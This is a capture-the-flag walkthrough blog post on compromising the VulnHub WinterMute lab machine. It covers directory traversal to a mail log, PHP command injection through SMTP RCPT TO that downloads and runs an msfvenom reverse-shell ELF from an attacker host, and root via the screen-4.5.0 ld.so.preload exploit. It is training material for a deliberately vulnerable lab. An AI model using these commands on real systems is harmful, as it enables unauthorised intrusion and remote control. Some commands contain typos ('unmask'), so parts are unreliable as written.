<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the WinterMute: 1 (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-wintermute-1-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2018-08-11T06:44:05+00:00">August 11, 2018</time><time class="updated" datetime="2025-06-10T20:29:39+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends! Today we are going to take another CTF challenge known as <strong>Wintermute (Part 1) </strong>and it is another boot2root challenge provided for practice. So let’s try to break through it. But before please note that you can download it from here <a style="color: #000000;" href="https://www.vulnhub.com/entry/wintermute-1,239/">https://www.vulnhub.com/entry/wintermute-1,239/</a></span></p>
<p><span style="color: #000000;"><strong>Security Level:</strong> Intermediate</span></p>
<p><span style="color: #000000;"><strong><u>Author Note</u>: </strong>There are 2 important things to note down for this lab</span></p>
<ol>
<li><span style="color: #000000;">No buffer overflows or exploits development – any necessary password cracking can be done with small wordlists.</span></li>
<li><span style="color: #000000;">Straylight – simulates a public facing server with 2 NICs. Cap this first, then pivot to the final machine. Neuromancer – is within a non-public network with 1 NIC.</span></li>
</ol>
<p><span style="color: #000000;"><strong><u>Imp Note</u>:</strong> This lab has 2 parts. The 1<sup>st</sup> part comprises of gaining the root shell of the victim machine and subsequently pivoting to another machine.T o begin with, this is the 1<sup>st</sup> part of the lab; a post which we will publish the 2<sup>nd</sup> lab in upcoming days</span></p>
<p><span style="color: #000000;"><strong>Penetrating Methodologies </strong></span></p>
<ul>
<li><span style="color: #000000;">Network Scanning (Nmap, netdiscover)</span></li>
<li><span style="color: #000000;">HTTP service enumeration</span></li>
<li><span style="color: #000000;">Directory Traversal in the browser using Email log files</span></li>
<li><span style="color: #000000;">Exploiting OS command injection in RCPT option of SMTP</span></li>
<li><span style="color: #000000;">Generate PHP Backdoor (Msfvenom)</span></li>
<li><span style="color: #000000;">Execute the backdoor embedded in RCPT option</span></li>
<li><span style="color: #000000;">Reverse connection (Metasploit)</span></li>
<li><span style="color: #000000;">Import python one-liner for proper TTY shell</span></li>
<li><span style="color: #000000;">Identify the appropriate vulnerable SUID</span></li>
<li><span style="color: #000000;">Exploiting target (exploit 4115)</span></li>
<li><span style="color: #000000;">Get root access and capture the flag</span></li>
</ul>
<p><span style="color: #000000;"><strong><u>WalkThrough</u></strong></span></p>
<p><span style="color: #000000;">Let’s start off with scanning the network to find our target.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-avWw4te5cH4/W25-u0e4rGI/AAAAAAAAZl4/rj8jPSnsJCciHBXBCGMKztQZIiKBnT3MwCLcBGAs/s1600/0.png"/></span></p>
<p><span style="color: #000000;">We found our target –&gt; 192.168.1.124</span></p>
<p><span style="color: #000000;">Our next step is to scan our target with NMAP.</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.1.124</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ufGnfMxx0RE/W25-uz-PO7I/AAAAAAAAZl8/FZ90A1lc7DwtVHz-7l1-jx5kS_07hRi2QCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">The NMAP output shows us that there are 3 ports opened: 25 (SMTP), 80 (HTTP), 3000</span></p>
<p><span style="color: #000000;">Browsed the URL http://192.168.1.124 and poked around; however, we were not able to get any significant clues to move forward  </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-MQ5s18C1HZQ/W25-w-x-yzI/AAAAAAAAZmk/CQ-FhlTei0YG4RrYFdJQpX4nTXkYc3_AwCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">As we are aware that port 3000 is also opened on the victim machine, hence let’s try to access the website on a Non-standard HTTP port (3000) as follows :</span></p>
<p><span style="color: #000000;">Browse to http://192.168.1.124:3000 and we will be greeted with the following page</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-J21Ql5UKZrc/W25-yWJe6WI/AAAAAAAAZm8/31qdBPJ4af8x4iL13Nn9bRCU714BU6dBwCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">As we can see a Hint at the bottom of the page, the default username and credentials are already provided to us! Let’s try to login to the page with them</span></p>
<p><span style="color: #000000;"><strong>Username</strong>: admin</span></p>
<p><span style="color: #000000;"><strong>Password:</strong> admin</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-2dWT776kVFk/W25-ys80w3I/AAAAAAAAZnA/K1c1BMJF6aMdG8GWSLoiDoaMzH7lx7l7ACLcBGAs/s1600/4.png"/></span></p>
<p> </p>
<p><span style="color: #000000;">On clicking the <strong>Flows</strong> option, we were redirected to the following page:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ez5Wa6w7fGc/W25-ylTgXrI/AAAAAAAAZnE/lPHaUJUwT7cOej4M5uw_E9gWRHKxafeEwCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Here we observed few directories were listed (as shown in the screenshot above), hence we thought of appending them to our URL http://192.168.1.124/ OR http://192.168.1.124:3000/</span></p>
<p><span style="color: #000000;">We tried accessing http://192.168.1.124:3000/turing-bolo/ however no success. Then we browsed the URL http://192.168.1.124/turing-bolo/ and got below page</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-tYEQXYQcD0k/W25-zPj5nkI/AAAAAAAAZnI/IMqgDpYxVqAyANVhGEUHLMx-lwxc-9YNgCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;"> Click on Submit Query and we are redirected to the following page</span></p>
<pre class="lang:default decode:true">http://192.168.1.124/turing-bolo/bolo.php?bolo=case</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-aNNdQAokF-0/W25-zigOmtI/AAAAAAAAZnQ/G_cfXdbfbbE65WGE1eY2QDpvkOa2YpLUACLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">From the above screenshot, we can see a few log files (as highlighted). Per our experience, this could be an indication of Directory traversal where we can execute writeable files in the browser. Hence let’s try to append  <strong>../../../log/mail</strong> to the URL in the browser as follows :</span></p>
<pre class="lang:default decode:true">http://192.168.1.124/turing-bolo/bolo.php?bolo=../../../log/mail</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wqorKfgpDZk/W25-zdoiiLI/AAAAAAAAZnM/w_YiYhNOKPA55y4BzbI2-9UpAx4jQr-RQCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Now let’s try to enumerate further and connect to the SMTP (25) port</span></p>
<pre class="lang:default decode:true ">telnet 192.168.1.124 25</pre>
<p><span style="color: #000000;">As we can see, we got connected to the victim machine successfully. Now let’s try to send a mail via command line (CLI) of this machine and send the OS commands via the “<strong>RCPT TO”</strong> option.</span></p>
<pre class="lang:default decode:true">MAIL FROM:&lt;rrajchandel@gmail.com&gt;
220 straylight ESMTP Postfix (Debian/GNU)
250 2.1.0 Ok
RCPT TO:&lt;?php system('whoami'); ?&gt;
501 5.1.3 Bad recipient address syntax</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-JdZFL_1R1gc/W25-zlictzI/AAAAAAAAZnU/8CsG7aBFYcMEGklKk_K5zFhw2KdC7R9VgCLcBGAs/s1600/9.png"/></strong></span></p>
<p><span style="color: #000000;"><strong>Note:</strong> We can ignore the 501 5.1.3 Bad recipient address syntax server response as seen in the above screenshot because ideally the internal email program of the server (victim machine), is expecting us to input an email ID and not the OS commands.</span></p>
<p><span style="color: #000000;">Now navigate back to the URL http://192.168.1.124/turing-bolo/bolo.php?bolo=../../../log/mail  </span></p>
<p><span style="color: #000000;">As depicted in the below screenshot of the browser, we can clearly see that mail logs files are displaying response output <strong>(www-data)</strong> of the Unix (OS) command <strong>whoami</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-KUQjuxp_XvQ/W25-uyD3wBI/AAAAAAAAZmA/RrisAyfSp5EgizaiZ5XQu8DECjoHFbzbgCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Let’s generate a Reverse shell with the following command</span></p>
<pre class="lang:default decode:true">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.134 lport=4444 -f elf &gt; shell.elf</pre>
<p><span style="color: #000000;">Now run the web server on the Kali machine</span></p>
<pre class="lang:default decode:true">python –m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EoUspTYstIE/W25-vsgGP3I/AAAAAAAAZmE/CiMlQmMNWgUkqdd2ejhXLRPa-Ul-JyErACLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">As we got success in receiving the response of OS commands in the email log files, in a similar way there is a possibility that following this method, we may also get the Meterpreter access of the victim machine</span></p>
<p><span style="color: #000000;">Hence as seen in the below screenshot, we will pass the commands in RCPT command as follows :</span></p>
<p><span style="color: #000000;">1. Navigate to <strong>the/tmp </strong>directory and Download the <strong>shell.elf</strong> file from Kali machine</span></p>
<p><span style="color: #000000;">2. Modify the permissions of the shell.elf file</span></p>
<p><span style="color: #000000;">3.Execute our Reverse shell (shell.elf) file</span></p>
<pre class="lang:default decode:true ">RCPT TO:&lt;?php system('cd /tmp; wget http://192.168.1.134/shell.elf'); ?&gt;
501 5.1.3 Bad recipient address syntax
RCPT TO:&lt;?php system('chmod 777 /tmp/shell.elf'); ?&gt;
501 5.1.3 Bad recipient address syntax
RCPT TO:&lt;?php system('/tmp/shell.elf'); ?&gt;
501 5.1.3 Bad recipient address syntax</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-MMzIEamKV1Q/W25-vgNRNJI/AAAAAAAAZmI/IhwtzabLH_M_dAC7fK1hFjInkqaId16wwCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Now in parallel, open the Metasploit console and perform the following</span></p>
<pre class="lang:default decode:true">msf &gt; use exploit/multi/handler
msf exploit(handler) &gt; set payload linux/x86/meterpreter/reverse_tcp
msf exploit(handler) &gt; set lhost 192.168.1.134
msf exploit(handler) &gt; set lport 4444
msf exploit(handler) &gt; run</pre>
<p><span style="color: #000000;">Awesome!! We got the Meterpreter session</span></p>
<p><span style="color: #000000;">Using <strong>sysinfo</strong> command, we found machine architecture details which may eventually help us to find out the kernel exploit for privilege escalation</span></p>
<pre class="lang:default decode:true">sysinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FCz6mKmQh20/W25-vkOhj1I/AAAAAAAAZmM/Mfna8Xad8ngGLKIHuVSV0gpG2z0LTNi2ACLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Further, navigate to shell</span></p>
<pre class="lang:default decode:true">shell</pre>
<p><span style="color: #000000;">In order to access proper TTY shell, we had imported python one line script by typing following:</span></p>
<pre class="lang:default decode:true">python -c 'import pty;pty.spawn("/bin/bash")'</pre>
<p><span style="color: #000000;">Now let’s trigger the post-exploitation and try to get root access. Then by using the following command, we can enumerate all binaries having SUID permission.</span></p>
<pre class="lang:default decode:true">find / -perm -4000 2&gt;/dev/null</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KXDd44jeb6U/W25-wPnVnBI/AAAAAAAAZmQ/HKEioHDM_6IDLQgcvuCVAciEgxq5lziswCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Per the above output, it has dumped all system binaries having SUID permissions; however <strong>/bin/screen-4.5.0</strong> seems to be interesting. Therefore first let us begin escalating the root privileges</span></p>
<p><span style="color: #000000;">Upon searching exploit in kalilinux for the <strong>screen-4.5.0 exploit</strong>,</span></p>
<pre class="lang:default decode:true">searchsploit screen 4.5.0</pre>
<p><span style="color: #000000;">From given below image we can observe the highlighted <strong>exploit 41154.sh</strong> which is a shell script for local privilege escalation.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-BKcvSYWM7Bo/WsDxkBrWz1I/AAAAAAAAV7A/iC9ee1xlO_IRtibYWtf_-XuAhm2i2ooZwCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">When we didn’t find any appropriate method to execute this shell script for post exploitation, then we approached the manual compilation method and reviewed its code using <strong>cat </strong>command.</span></p>
<pre class="lang:default decode:true">cat /usr/share/exploitdb/exploits/linux/local/41154.sh</pre>
<p><span style="color: #000000;">If you will notice the following code, then you will observe this script is written in C language and we have divided it into <strong>three parts</strong> for manual compilation.</span></p>
<ol>
<li><span style="color: #000000;"><strong> Copy Yellow</strong> highlighted the code and past it in a text document and save it as <strong>libhax.c</strong></span></li>
<li><span style="color: #000000;"><strong> Copy Orange</strong> highlighted the code and past it in a text document and save it as <strong>rootshell.c</strong></span></li>
</ol>
<p><span style="color: #000000;">3.Copy the remaining code in notepad , to paste it for the latter part of the section (<strong><u>Compilation of C Program files)</u></strong></span></p>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://2.bp.blogspot.com/-Ui8tANVpMJs/WsDxkanrZqI/AAAAAAAAV7I/ENdFkUnP0sALGaiN5Q6kG_CWagAM5O7gACLcBGAs/s1600/14.png"/></strong></span></p>
<p><span style="color: #000000;">From given below image you can see I have pasted above copied inside the file <strong>rootshell.c</strong></span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-lKI4tjQ_3wg/WsDxlebigCI/AAAAAAAAV7U/DSziBStSvs0Kd3B3otW61hS6Jbb0600AgCLcBGAs/s1600/16.png"/></strong></span></p>
<p><span style="color: #000000;">From given below image you can see I have pasted above copied inside the file <strong>libhax.c</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-L6UlAmep198/WsDxlHRtTxI/AAAAAAAAV7M/ok0obY8OKoMSZhZrbCZhr6i3wCK9Ab9GgCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">We will save the <strong>libhax.c</strong> and <strong>rootshell.c</strong> files in the Kali Desktop shell directory for further use. Here we can see the contents of both the files in the below image</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-7QcS8_KZ2aw/W25-xH-rNSI/AAAAAAAAZmo/Y6cYrKO75Go932468nL2Io00KVd6_FLDQCLcBGAs/s1600/20.png"/></span></p>
<p><span style="color: #000000;">Now go back to the Meterpreter session and upload the exploit files from Kali machine Meterpreter session to the <strong>/tmp</strong> directory of the target (victim) machine.</span></p>
<pre class="lang:default decode:true">upload libhax.c /tmp
upload rootshell.c /tmp</pre>
<p><span style="color: #000000;">Further, navigate to shell</span></p>
<pre class="lang:default decode:true">shell</pre>
<p><span style="color: #000000;">In order to access proper TTY shell, we had imported python one line script by typing following:</span></p>
<pre class="lang:default decode:true">python -c 'import pty;pty.spawn("/bin/bash")'</pre>
<p><span style="color: #000000;"><strong><u>Compilation of C Program files</u></strong></span></p>
<p><span style="color: #000000;"><strong>Note:</strong> Refer to website <a style="color: #000000;" href="https://www.exploit-db.com/exploits/41154">https://www.exploit-db.com/exploits/41154</a> for the below commands</span></p>
<p><span style="color: #000000;">Let’s compile our C program file manually in our local system using gcc as given below.</span></p>
<p><span style="color: #000000;">1. Compile <strong>libhax.c</strong> file through the following command.</span></p>
<pre class="lang:default decode:true">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</pre>
<p><span style="color: #000000;">2. Similarly, compile <strong>rootshell.c</strong> file through the following command.</span></p>
<pre class="lang:default decode:true">gcc -o /tmp/rootshell /tmp/rootshell.c</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-iarNhRN5X6s/W25-xmWXu3I/AAAAAAAAZmw/ck6bY1q3WGEWQpKLYKVehYBcn6Akz-2BACLcBGAs/s1600/22.png"/></span></p>
<p><span style="color: #000000;">Navigate to /etc directory and run the commands further</span></p>
<pre class="lang:default decode:true ">cd /etc
unmask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
screen -ls</pre>
<p><span style="color: #000000;">Proceed forward and access the /tmp/rootshell folder of the victim machine by typing :</span></p>
<pre class="lang:default decode:true">/tmp/rootshell</pre>
<p><span style="color: #000000;">Hurray !! We got into the root</span></p>
<p><span style="color: #000000;">Navigate to the root directory</span></p>
<pre class="lang:default decode:true">cd /root</pre>
<p><span style="color: #000000;">Let’s see what file it contains</span></p>
<pre class="lang:default decode:true">ls</pre>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://2.bp.blogspot.com/-3rJAomA72NQ/W25-xpKTl-I/AAAAAAAAZm0/B9_j2QTy4vI0S2rZ82-gvo0UzP29dncVwCLcBGAs/s1600/23.png"/></strong></span></p>
<pre class="lang:default decode:true">cat flag.txt</pre>
<p><span style="color: #000000;">Wonderful!! We have gained access to the flag and hacked this box.</span></p>
<p><span style="color: #000000;">There seems to be another interesting file <strong>note.txt</strong>, let’s open the same and see what it contains</span></p>
<pre class="lang:default decode:true ">cat note.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PlqIPu_S1Lo/W25-x7qArCI/AAAAAAAAZm4/l5oB_mLdcAkRB-HO9qMa3x8WARjhiki1wCLcBGAs/s1600/24.png"/></span></p>
<p><span style="color: #000000;">As we can see there is a clue (vulnerability) for the next part (part 2) of this lab</span></p>
<p><span style="color: #000000;">Stay tuned!! We will be back with the next part of another article!</span></p>
<p><span style="color: #000000;"><strong>Author:</strong> Ankur Sachdev is an Information Security consultant and researcher in the field of Network &amp; WebApp Penetration Testing. Contact <strong><a href="https://www.linkedin.com/in/sachdevankur/">Here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
